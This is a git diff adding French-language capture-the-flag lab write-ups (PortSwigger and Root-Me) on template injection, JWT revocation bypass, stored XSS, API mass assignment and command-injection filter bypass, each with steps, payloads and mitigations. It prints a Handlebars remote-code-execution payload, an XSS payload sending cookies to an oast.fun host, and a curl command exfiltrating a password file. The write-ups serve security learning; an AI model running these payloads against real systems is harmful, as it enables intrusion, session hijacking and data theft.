@@ -255,6 +255,189 @@ source : https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forge
 
 https://owasp.org/www-community/attacks/csrf
 
-[https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit](SSTI)
+## [SSTI](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+
+Il y a dans l’url un paramétre **message** que l’on va pourvoir exploiter pour la faille de sécurité
+
+je commence par le payload ``{{7*7}}`` qui va me donner une erreur me permettant d’identifier du handlebars pour le moteur de template. 
+
+ensuite je cherche l’exploit comme annoncer dans la descriptiojn du lab : https://hackerone.com/reports/423541
+
+on comprends qu’il faut remonter dans le constructor afin de trouver l’object function qui va nous permttre d’exécuter des commandes dans le back-end du site.
+
+<img width="1284" height="700" alt="Capture d&#39;écran 2026-04-18 202001" src="https://github.com/user-attachments/assets/ea69cc88-02bf-4d77-a83a-e98b759e0122" />
+
+### Payload : 
+
+``wrtz{{#with "s" as |string|}}
+{{#with "e"}}
+{{#with split as |conslist|}}
+{{this.pop}}
+{{this.push (lookup string.sub "constructor")}}
+{{this.pop}}
+{{#with string.split as |codelist|}}
+{{this.pop}}
+{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+{{this.pop}}
+{{#each conslist}}
+{{#with (string.sub.apply 0 codelist)}}
+{{this}}
+{{/with}}
+{{/each}}
+{{/with}}
+{{/with}}
+{{/with}}
+{{/with}}``
+
+``[https://0aa900ec048c490281d37adb0047002d.web-security-academy.net/?message=wrtz{{%23with "s" as |string|}}
+    {{%23with "e"}}
+        {{%23with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{%23with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('rm %2Fhome%2Fcarlos%2Fmorale.txt')%3B"}}
+                {{this.pop}}
+                {{%23each conslist}}
+                    {{%23with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{%2Fwith}}
+                {{%2Feach}}
+            {{%2Fwith}}
+        {{%2Fwith}}
+    {{%2Fwith}}
+{{%2Fwith}}](https://0aa900ec048c490281d37adb0047002d.web-security-academy.net/?message=wrtz%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.exec%28%27rm%20%2Fhome%2Fcarlos%2Fmorale.txt%27%29%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D)``
+
+### Mesure de sécurité : 
+- Valider et sanitize les input dans le backend
+- utiliser des moteur de template avec des protection intégrées
+- echapper les entrées utilisateurs, whitelist, fonction de filtre
+
+### Source : 
+
+https://xygeni.io/blog/handlebars-js-safe-usage-to-avoid-injection-flaws/
+
+https://www.omnicybersecurity.com/case_studies/case-study-template-injection-vulnerabilities/
+
+## [JWT Token revoqué](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque)
+
+j’ai d’abord regarder le code source où j’ai idenitifié deux choses : 
+
+- Le token donné sera blacklist directement aprés avoir été donnée, il sera expirée
+- Il est signé
+
+j’ai donc essayer d’enlever la signature mais cela n’as pas marché, je me suis donc dit que je doit utilisée un token une seule fois sans changer le token.
+
+j’ai donc revue le fonctionement d’un token jwt qui est codé en base64 et j’ai donc regarder l’encodement sur cette base et donc j’ai vu le “=” qui permet d’ajouter un caractére afin de faire augmenter la chaine de charactére sans la modifierce.
+
+<img width="1597" height="202" alt="Capture d&#39;écran 2026-04-17 152248" src="https://github.com/user-attachments/assets/87b499d8-88fb-4a6f-ab97-eb5c5d004115" />
+
+<img width="1265" height="420" alt="Capture d&#39;écran 2026-04-17 151625" src="https://github.com/user-attachments/assets/626ce3f7-2e51-4481-9103-73cdedc90fbc" />
 
 
+### Payload : 
+
+``token=``
+
+### Mesure de sécurité : 
+- Blacklist / Liste de révocation
+- Tokens de courte durée + Refresh Tokens
+- Stockage **httponly** sécurisé des tokens
+
+### Source : 
+https://curity.io/resources/learn/jwt-best-practices/
+https://supertokens.com/blog/revoking-access-with-a-jwt-blacklist
+https://stackoverflow.com/questions/4080988/why-does-base64-encoding-require-padding-if-the-input-length-is-not-divisible-by
+
+## [XSS stockée](https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2)
+
+j’ai tout d’abord envoyer un message afin de savoir comment ça marche  
+
+j’ai essayé un payload pour afficher une alerte mais ça n’as pas marcher 
+
+ j’ai remarqué que le statut s’affiche dans le message
+
+j’ai regardé le code source et j’ai un une balise i avec le statut
+
+ensuite j’ai regarder avec burp la requête et j’ai remarqué le cookie
+
+j’ai changé le cookie avec le payload d’alerte et j’ai renvoyer un message, ce qui à éxécuté l’alerte 
+
+j’ai donc changer le cookie avec le payload suivant ``x"><script>document.location.href="http://uoxgqphuhvhiguvsajtyjm7m48212eic6.oast.fun/?cookie="+document.cookie</script>``
+
+le bot est ensuite passé et j’ai récupérai le cookie 
+
+puis j’ai usurpé la sesion administrateur avec le cookie
+
+<img width="1068" height="301" alt="Capture d&#39;écran 2026-04-19 003948" src="https://github.com/user-attachments/assets/670f714a-3b16-4cc7-9977-2eb05f9b898f" />
+
+<img width="631" height="452" alt="Capture d&#39;écran 2026-04-19 012102" src="https://github.com/user-attachments/assets/9b55cff6-8bec-4128-b1ad-94f61935af31" />
+
+### Mesure de sécurité : 
+- echapper les entrées utilisateurs, whitelist, fonction de filtre
+- Valider et sanitize les input dans le backend
+
+### Source : 
+https://www.cloudflare.com/fr-fr/learning/security/how-to-prevent-xss-attacks/
+
+## [API mass assignement](https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment)
+
+j’ai tout d’abors tester les routes pour me connecter et la route du flag puis j’ai teste afin de voir les information utilisateur que j’ai intercepter afin de changer la méthode pour voir si cela marché. 
+
+ensuite j’ai découvert que la méthode put m’afficher le message d’erreur suivant : **Did not attempt to load JSON data because the request Content-Type was not 'application/json'**
+
+j’ai donc ajouter l’entête pour envoyer du Json et j’ai l’erreur suivante : **The browser (or proxy) sent a request that this server could not understand**
+
+j’ai ensuite ajouter décider d’ajouté du json avec status : “admin” car cela correspond au statut de l’utilisateur et j’ai ensuite la validation avec la réponse suivante : **"message":"User updated sucessfully.”**  et je récupére le flag avec la route
+
+<img width="1432" height="401" alt="Capture d&#39;écran 2026-04-19 011212" src="https://github.com/user-attachments/assets/0b585d40-7af3-4313-b5ed-66f2c4c30c87" />
+
+<img width="1597" height="202" alt="Capture d&#39;écran 2026-04-17 152248" src="https://github.com/user-attachments/assets/82b11229-16f4-435c-ac60-c22b74d25113" />
+
+### Payload : 
+
+<img width="631" height="452" alt="Capture d&#39;écran 2026-04-19 012102" src="https://github.com/user-attachments/assets/f47322bd-efe9-4fa3-b8bc-a9b3b8a6e160" />
+
+### Mesure de sécurité : 
+- Utiliser des Data transfer object
+- Whitelister des champs autorisés et verbe HTTP
+- Validation côté serveur
+- Vérifier les permissions de l’utilisateur
+
+### Source : 
+https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html#solutions
+
+## [Coutournement de filtre](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)
+
+Je réalise d’abors un premier ping qui marche, j’essaye en suite de réaliser des commande avec avec un point virgule mais cela me donne une erreur. 
+
+par la suite j’essaye plusieurs paylaod et je trouve celui qui me permet de réaliser la sépration de commande “%0A”. 
+
+Je continue donc à tester les commandes avec le paylaod et cela me retourne le ping cependant nous avons pas l’erreur. 
+
+Je décide donc de curl vers un serveur interactsh, aprés plusieurs essaie j’arrive à ce paylaod et cela me retourne le code de la page (les deux images en dessous) :
+
+<img width="643" height="370" alt="image" src="https://github.com/user-attachments/assets/d0963032-2cc3-465a-a2ea-69d1b7b6fdc7" />
+
+<img width="1242" height="288" alt="image (1)" src="https://github.com/user-attachments/assets/5050fdcb-8503-410b-bb44-2f645f7d60c1" />
+
+En reagardant dans le code source on peut voir le fichiers passwd, je modifie donc mon paylaod afin d’accéder au fichier ‘127.0.0.1%0Acurl%20 d%20@.passwd%20http://choufoevsyviaxboptaexz20sxrix4kr8.oast.fun” qui me donner le flag
+
+<img width="547" height="350" alt="image (2)" src="https://github.com/user-attachments/assets/fae56cd6-cb8a-452e-807d-ad0bbdb7b986" />
+
+<img width="829" height="395" alt="image (3)" src="https://github.com/user-attachments/assets/4e31a4ef-4a88-44ae-8db0-5718ba04a948" />
+
+### Payload : 
+
+``127.0.0.1%0Acurl%20-d%20@.passwd%20http://choufoevsyviaxboptaexz20sxrix4kr8.oast.fun``
+
+### Mesure de sécurité : 
+- whitelist des entrées
+- api pour éviter appelé le shell directement
+- nettoyer les entrées
+- echapper les caractéres
+  
+### Source : 
+https://owasp.org/www-community/attacks/Command_Injection
+https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
